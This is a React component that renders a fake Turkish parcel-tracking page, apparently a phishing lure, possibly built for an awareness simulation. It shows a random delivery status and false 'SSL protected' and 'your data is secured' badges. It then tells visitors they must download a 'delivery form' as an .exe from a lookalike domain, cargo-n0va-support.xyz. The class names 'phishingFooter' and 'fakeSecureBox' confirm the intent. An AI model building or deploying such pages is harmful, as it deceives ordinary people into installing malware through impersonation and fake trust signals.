import React, { useState } from "react";
import styles from "./CargoTrackingFake.module.css";

const statusSteps = [
  {
    status: "Kargo Bilgisi Alındı",
    desc: "Kargo kaydınız oluşturuldu.",
    icon: "📝"
  },
  {
    status: "Yolda",
    desc: "Kargonuz teslimat merkezinde bekliyor.",
    icon: "🚚"
  },
  {
    status: "Dağıtımda",
    desc: "Kargonuz dağıtım için yola çıktı.",
    icon: "🏠"
  },
  {
    status: "Teslim Edildi",
    desc: "Kargonuz teslim edildi.",
    icon: "📦"
  },
];

function getUrlParams(url) {
  try {
    const u = new URL(url);
    const trackingNo = u.searchParams.get("trackingNo") || "F4K3XXXX";
    let shippingCompany = u.hostname.split(".")[0];
    shippingCompany = shippingCompany.charAt(0).toUpperCase() + shippingCompany.slice(1);
    return { shippingCompany, trackingNo };
  } catch {
    return { shippingCompany: "Cargonova", trackingNo: "F4K3XXXX" };
  }
}

const CargoTrackingFake = (props) => {
  const url = props.url || window.location.href;
  let { shippingCompany, trackingNo } = getUrlParams(url);

  if (props.shippingCompany) shippingCompany = props.shippingCompany;
  if (props.trackingNo) trackingNo = props.trackingNo;

  // Rastgele kargo statüsünü sahte olarak göster
  const [currentStep] = useState(() => Math.floor(Math.random() * statusSteps.length));
  const progress = Math.round(((currentStep + 1) / statusSteps.length) * 100);

  // Sahte form doldurma alanı için
  const [formName, setFormName] = useState("");
  const [formSurname, setFormSurname] = useState("");

  return (
    <div className={styles.fakeTrackingMain}>
      <div className={styles.leftPanel}>
        <div className={styles.trackingContainer}>
          <div className={styles.header}>
            <img
              src={`/cargo/cargonova.png`}
              alt={shippingCompany}
              className={styles.logo}
            />
            <div className={styles.headerInfo}>
              <h2>{shippingCompany} Kargo Takip</h2>
              <div className={styles.trackingNo}>Takip No: <span>{trackingNo}</span></div>
            </div>
          </div>

          <div className={styles.progressBarBox}>
            <div className={styles.progressBarBg}>
              <div className={styles.progressBar} style={{ width: `${progress}%` }} />
            </div>
            <div className={styles.progressLabel}>
              <span>{statusSteps[currentStep].status}</span>
              <span className={styles.progressPercent}>{progress}%</span>
            </div>
          </div>

          <ul className={styles.statusSteps}>
            {statusSteps.map((step, idx) => (
              <li
                key={idx}
                className={`${styles.stepItem} ${idx <= currentStep ? styles.active : ""}`}
              >
                <span className={styles.stepIcon}>{step.icon}</span>
                <div>
                  <b>{step.status}</b>
                  <div className={styles.stepDesc}>{step.desc}</div>
                </div>
              </li>
            ))}
          </ul>

          <div className={styles.details}>
            <div>
              <span className={styles.label}>Tahmini Teslimat:</span>
              <span>1-2 iş günü</span>
            </div>
          </div>

          <div className={styles.phishingFooter}>
            <span>
              <b>Teslimat bilgileriniz tarafımızca güvence altındadır.</b>
            </span>
          </div>
        </div>
      </div>

      <div className={styles.rightPanel}>
        <div className={styles.downloadSection}>
          <h2 className={styles.downloadTitle}>🛡️ Kargo Teslim Formu</h2>
          <p className={styles.formInfo}>
            Kargonuzu teslim alabilmek için <b>teslimat formunu</b> indirip doldurmanız gerekmektedir.<br />
          </p>
          <form className={styles.fakeForm} onSubmit={e => e.preventDefault()}>
            <label>
              Adınız:
              <input
                type="text"
                value={formName}
                onChange={e => setFormName(e.target.value)}
                placeholder="Adınızı girin"
                autoComplete="off"
                spellCheck={false}
              />
            </label>
            <label>
              Soyadınız:
              <input
                type="text"
                value={formSurname}
                onChange={e => setFormSurname(e.target.value)}
                placeholder="Soyadınızı girin"
                autoComplete="off"
                spellCheck={false}
              />
            </label>
            <a
              href="http://cargo-n0va-support.xyz/download/Cargo_Teslim_Formu_2025.exe"
              download
              className={styles.downloadButton}
              style={{ marginTop: "14px" }}
            >
              📥 Kargo Teslim Formunu İndir (.exe)
            </a>
          </form>
          <div className={styles.fakeSecureBox}>
            <img src="/techDepo/ssl.png" alt="SSL Icon " />
            <span><b>SSL ile korunan bağlantı</b> <span style={{color:'#2fd26b'}}>✓</span></span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CargoTrackingFake;
